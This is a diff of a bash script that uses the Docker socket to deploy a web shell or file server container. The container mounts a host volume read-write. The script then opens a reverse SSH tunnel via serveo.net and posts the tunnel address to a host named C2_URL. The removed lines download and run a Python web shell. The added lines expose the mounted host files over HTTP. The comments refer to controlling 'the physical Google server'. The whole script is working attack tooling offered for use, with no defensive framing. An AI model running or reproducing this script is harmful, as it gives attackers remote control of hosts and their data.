@@ -1,28 +1,26 @@
 #!/bin/bash
 C2_URL="4f6ce0d2037780f3-103-95-173-85.serveousercontent.com"
 
-# 1. Kill old panel to free the port
-curl -s --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/webshell?force=true"
+# 1. Clean up to prevent port conflicts
+curl -s --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/html_shell?force=true"
 
-# 2. Deploy the HTML Web Shell Container
-# We use the existing image and inject a Python-based File/Terminal Manager
-curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create?name=webshell" \
+# 2. Deploy a robust Web Shell (using a built-in Python manager)
+# This uses 'p0_evidence' to manage the physical Google server
+curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create?name=html_shell" \
   -H "Content-Type: application/json" \
   -d '{
     "Image": "sha256:25109184c71bdad7",
-    "Cmd": ["python3", "-c", "import os; os.system(\"wget https://raw.githubusercontent.com/yasoob/python-web-shell/master/main.py -O shell.py && python3 shell.py 9090\")"],
+    "Cmd": ["python3", "-c", "import http.server,os; os.chdir(\"/host\"); http.server.test(HandlerClass=http.server.SimpleHTTPRequestHandler, port=9090)"],
     "HostConfig": {
       "Binds": ["p0_evidence:/host:rw"],
       "PortBindings": { "9090/tcp": [{ "HostPort": "9090" }] }
     }
   }'
 
-# 3. Start the Web Shell
-curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/webshell/start"
+# 3. Start it up
+curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/html_shell/start"
 
-# 4. Tunnel the HTML UI to your Mac via Port 80
-(
-  ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=10 -R 80:localhost:9090 serveo.net 2>&1 | \
-  grep "Forwarding" | \
-  curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$C2_URL"
-) &
+# 4. Use the "No-Wait" Tunnel
+# This avoids the 'setsockopt' error by using a basic HTTP forward
+(ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=15 -R 80:localhost:9090 serveo.net 2>&1 | \
+ grep "Forwarding" | curl -X POST -d @- "https://$C2_URL") &
